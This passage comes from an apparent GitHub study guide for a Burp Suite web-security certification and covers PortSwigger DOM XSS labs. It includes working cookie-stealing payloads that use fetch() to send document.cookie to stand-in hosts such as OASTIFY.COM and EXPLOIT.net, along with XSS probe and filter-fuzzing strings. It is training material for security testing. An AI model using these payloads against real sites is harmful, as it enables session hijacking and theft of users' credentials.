src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/DOM-XSS-AddEventListener-JavaScript-URL.png\" alt=\"DOM-XSS AddEventListener JavaScript URL\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url\" rel=\"nofollow\"\u003ePortSwigger Lab: DOM XSS using web messages and a JavaScript URL\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eDOM XSS AddEventListener Ads Message\u003c/h3\u003e\u003ca id=\"user-content-dom-xss-addeventlistener-ads-message\" class=\"anchor\" aria-label=\"Permalink: DOM XSS AddEventListener Ads Message\" href=\"#dom-xss-addeventlistener-ads-message\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eIn the \u003ccode\u003esource code\u003c/code\u003e we \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e the call using \u003ccode\u003eaddEventListener\u003c/code\u003e and an element id \u003ccode\u003eads\u003c/code\u003e being referenced.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/source-code-web-message-ads.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/source-code-web-message-ads.png\" alt=\"Source code web message ads\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThe \u003ccode\u003efetch\u003c/code\u003e function enclose the collaborator target inside \u003cstrong\u003eback ticks\u003c/strong\u003e, and when the iframe loads on the victim browser, the \u003ccode\u003epostMessage()\u003c/code\u003e method sends a web message to their home page.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;iframe src=\u0026quot;https://TARGET.net/\u0026quot; onload=\u0026quot;this.contentWindow.postMessage('\u0026lt;img src=1 onerror=fetch(`https://OASTIFY.COM?collector=`+btoa(document.cookie))\u0026gt;','*')\u0026quot;\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003eiframe\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003esrc\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ehttps://TARGET.net/\u003c/span\u003e\" \u003cspan class=\"pl-c1\"\u003eonload\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ethis.contentWindow.postMessage('\u0026lt;img src=1 onerror=fetch(`https://OASTIFY.COM?collector=`+btoa(document.cookie))\u0026gt;','*')\u003c/span\u003e\"\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eReplacing the Burp Lab payload \u003ccode\u003eprint()\u003c/code\u003e with \u003ccode\u003efetch()\u003c/code\u003e in the above code allow attacker to steal the victim session cookie.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/AddEventListener-Ads-Message.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/AddEventListener-Ads-Message.png\" alt=\"AddEventListener Ads Message\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages\" rel=\"nofollow\"\u003ePortSwigger Lab: DOM XSS using web messages\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eReflected DOM XSS\u003c/h3\u003e\u003ca id=\"user-content-reflected-dom-xss\" class=\"anchor\" aria-label=\"Permalink: Reflected DOM XSS\" href=\"#reflected-dom-xss\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eIn the \u003cstrong\u003eSearch\u003c/strong\u003e function a Reflected DOM-XSS vulnerability is \u003cem\u003e\u003cstrong\u003eidentified\u003c/strong\u003e\u003c/em\u003e using DOM Invader as being inside an \u003ccode\u003eeval()\u003c/code\u003e function.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/dom-invader-reflected-dom-xss-identify.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/dom-invader-reflected-dom-xss-identify.png\" alt=\"DOM Invader reflected dom-xss identify\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cem\u003e\u003cstrong\u003eIdentify\u003c/strong\u003e\u003c/em\u003e that the search JavaScript \u003ccode\u003esource code\u003c/code\u003e on the target, the string is reflected in a JSON response called search-results.\nFrom the Site Map, open the \u003ccode\u003esearchResults.js\u003c/code\u003e file and notice that the JSON response is used with an \u003ccode\u003eeval()\u003c/code\u003e function call.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/reflected-dom-xss-source-code.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/reflected-dom-xss-source-code.png\" alt=\"Reflected DOM-XSS source-code\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eTesting \u003ccode\u003e\\\"-alert(1)}//\u003c/code\u003e payload we successfully escape the \u003ccode\u003eeval()\u003c/code\u003e. The attacker then craft an exploit phishing link to the victim with a \u003ca href=\"https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/5cbfeb2a11577ad62a31f72635a000bf5dcce293/payloads/CookieStealer-Payloads.md\"\u003ecookie stealing payload\u003c/a\u003e hosted on exploit server.\u003cbr\u003e\nAbove payload validate that the backslash \u003cstrong\u003e\\\u003c/strong\u003e is not sanitized, and the JSON data is then send to \u003ccode\u003eeval()\u003c/code\u003e.  Backslash is not escaped correctly and when the JSON response attempts to escape the opening double-quotes character, it adds a \u003cstrong\u003esecond\u003c/strong\u003e backslash. The resulting double-backslash causes the escaping to be effectively \u003cstrong\u003ecancelled out\u003c/strong\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-js notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\\\u0026quot;-fetch('https://OASTIFY.COM?reflects='+document.cookie)}//\"\u003e\u003cpre\u003e\\\"\u003cspan class=\"pl-c1\"\u003e-\u003c/span\u003e\u003cspan class=\"pl-en\"\u003efetch\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e'https://OASTIFY.COM?reflects='\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003edocument\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003ecookie\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e/\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e/\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eIn the above payload every character is URL encoded and used as the search parameter value. This target do not have an exploit server, so I hosted my own \u003ccode\u003epython3 -m http.server 80\u003c/code\u003e web service and save the \u003ccode\u003eindex.html\u003c/code\u003e file that contain the \u003ccode\u003elocation\u003c/code\u003e target URL between \u003ccode\u003e\u0026lt;script\u0026gt;\u003c/code\u003e tags.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/reflected-dom-xss-json-cookie-stealer.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/reflected-dom-xss-json-cookie-stealer.png\" alt=\"Reflected DOM-XSS JSON cookie stealer\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eIn the image above, I create insecure POC cookie value in my browser before simulating a victim user clicking on \u003ccode\u003ehttp://localhost/index.html\u003c/code\u003e link, same as Burp Exploit server, that is the same as the Deliver exploit to victim function.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected\" rel=\"nofollow\"\u003ePortSwigger Lab: Reflected DOM XSS\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eDOM-XSS LastviewedProduct Cookie\u003c/h3\u003e\u003ca id=\"user-content-dom-xss-lastviewedproduct-cookie\" class=\"anchor\" aria-label=\"Permalink: DOM-XSS LastviewedProduct Cookie\" href=\"#dom-xss-lastviewedproduct-cookie\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cem\u003e\u003cstrong\u003eIdentify\u003c/strong\u003e\u003c/em\u003e the cookie \u003ccode\u003elastViewedProduct\u003c/code\u003e is set to the last URL visited under the product page.\u003cbr\u003e\nIn the \u003ccode\u003esource code\u003c/code\u003e we identify the injection script tags where \u003ccode\u003ewindow.location\u003c/code\u003e is set.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/dom-xss-lastViewedProduct-cookie.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/dom-xss-lastViewedProduct-cookie.png\" alt=\"DOM-XSS lastViewedProduct cookie code\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eTesting the escape out of of the script string for the value of \u003cstrong\u003edocument.location\u003c/strong\u003e using \u003ccode\u003e/product?productId=1\u0026amp;'\u0026gt;fuzzer\u003c/code\u003e.\u003cbr\u003e\nNote that \u003cstrong\u003edocument.location\u003c/strong\u003e value cannot be URL encoded.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eOn exploit server add the following iframe to the body:\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;iframe src=\u0026quot;https://TARGET.net/product?productId=1\u0026amp;'\u0026gt;\u0026lt;script\u0026gt;fetch('https://EXPLOIT.net/log?c='%2bdocument.cookie)\u0026lt;/script\u0026gt;\u0026quot; onload=\u0026quot;if(!window.x)this.src='https://TARGET.net';window.x=1;\u0026quot;\u0026gt;\n\u0026lt;/iframe\u0026gt;\n\"\u003e\u003cpre\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003eiframe\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003esrc\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ehttps://TARGET.net/product?productId=1\u0026amp;'\u0026gt;\u0026lt;script\u0026gt;fetch('https://EXPLOIT.net/log?c='%2bdocument.cookie)\u0026lt;/script\u0026gt;\u003c/span\u003e\" \u003cspan class=\"pl-c1\"\u003eonload\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003eif(!window.x)this.src='https://TARGET.net';window.x=1;\u003c/span\u003e\"\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003eiframe\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/DOM_based_cookie_manipulation.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/DOM_based_cookie_manipulation.png\" alt=\"DOM_based_cookie_manipulation.png\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eOnce the victim cookie is updated the Exploit server log captures their secret cookie value.\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eWith the great help from \u003cem\u003e\u003cstrong\u003eShehmeerAbidRajput\u003c/strong\u003e\u003c/em\u003e I updated this lab with his provided cookie stealer payload.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation\" rel=\"nofollow\"\u003ePortSwigger Lab: DOM-based cookie manipulation\u003c/a\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eCross Site Scripting\u003c/h2\u003e\u003ca id=\"user-content-cross-site-scripting\" class=\"anchor\" aria-label=\"Permalink: Cross Site Scripting\" href=\"#cross-site-scripting\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"#xss-resources\"\u003eXSS Resources\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#identify-allowed-tags\"\u003eIdentify allowed Tags\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#bypass-blocked-tags\"\u003eBypass Blocked Tags\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#xss-assign-protocol\"\u003eXSS Assign protocol\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#custom-tags-not-blocked\"\u003eCustom Tags not Blocked\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#onhashchange\"\u003eOnHashChange\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#reflected-string-xss\"\u003eReflected String XSS\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#reflected-string-extra-escape\"\u003eReflected String Extra Escape\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#angularjs-sandbox-escape\"\u003eAngularJS Sandbox Escape\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#xss-template-literal\"\u003eXSS Template Literal\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#xss-via-json-into-eval\"\u003eXSS via JSON into EVAL\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#stored-xss\"\u003eStored XSS\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#stored-dom-xss\"\u003eStored DOM XSS\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#xss-svg-upload\"\u003eXSS in SVG Upload\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eXSS Resources\u003c/h3\u003e\u003ca id=\"user-content-xss-resources\" class=\"anchor\" aria-label=\"Permalink: XSS Resources\" href=\"#xss-resources\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eXSS Resources pages to lookup payloads for \u003cstrong\u003etags\u003c/strong\u003e and \u003cstrong\u003eevents\u003c/strong\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003ca href=\"https://portswigger.net/web-security/cross-site-scripting/cheat-sheet\" rel=\"nofollow\"\u003eCross-site scripting (XSS) cheat sheet\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-htmlapplications\"\u003ePayloadsAllTheThings (XSS)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/botesjuan/cpts-quick-references/blob/main/module/Cross-site-scripting-xss.md\"\u003eHackTheBox CPTS Study notes on XSS\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eCSP Evaluator tool to check if content security policy is in place to mitigate XSS attacks. Example is if the \u003ccode\u003ebase-uri\u003c/code\u003e is missing, this vulnerability will allow attacker to use the alternative exploit method described at \u003ca href=\"#upgrade-stored-self-xss\"\u003eUpgrade stored self-XSS\u003c/a\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003ca href=\"https://csp-evaluator.withgoogle.com/\" rel=\"nofollow\"\u003eCSP Evaluator\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eWhen input field maximum length is at only 23 character in length then use this resource for \u003cstrong\u003eTiny XSS Payloads\u003c/strong\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/terjanq/Tiny-XSS-Payloads\"\u003eTiny XSS Payloads\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eSet a unsecured test cookie in browser using browser DEV tools console to use during tests for POC XSS \u003ca href=\"https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/payloads/CookieStealer-Payloads.md\"\u003ecookie stealer payloads\u003c/a\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-js notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"document.cookie = \u0026quot;TopSecret=UnsecureCookieValue4Peanut2019\u0026quot;;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-smi\"\u003edocument\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003ecookie\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\"TopSecret=UnsecureCookieValue4Peanut2019\"\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eIdentify allowed Tags\u003c/h3\u003e\u003ca id=\"user-content-identify-allowed-tags\" class=\"anchor\" aria-label=\"Permalink: Identify allowed Tags\" href=\"#identify-allowed-tags\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eBasic XSS Payloads to \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e application security filter controls for handling data received in HTTP request.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;img src=1 onerror=alert(1)\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003eimg\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003esrc\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e1\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eonerror\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003ealert(1)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026quot;\u0026gt;\u0026lt;svg\u0026gt;\u0026lt;animatetransform onbegin=alert(1)\u0026gt;\"\u003e\u003cpre\u003e\"\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003esvg\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003eanimatetransform\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eonbegin\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003ealert(1)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"\u0026lt;\u0026gt;\\'\\\u0026quot;\u0026lt;script\u0026gt;{{7*7}}$(alert(1)}\u0026quot;-prompt(69)-\u0026quot;fuzzer\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e\u0026lt;\u0026gt;\\'\\\"\u0026lt;script\u0026gt;{{7*7}}$(alert(1)}\"-prompt(69)-\"fuzzer\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eSubmitting the above payloads may give response message, \u003cem\u003e\u003cstrong\u003e\"Tag is not allowed\"\u003c/strong\u003e\u003c/em\u003e due to Web Application Firewall (WAF) blocking injections.\nThen \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e allowed tags using \u003ca href=\"https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked\" 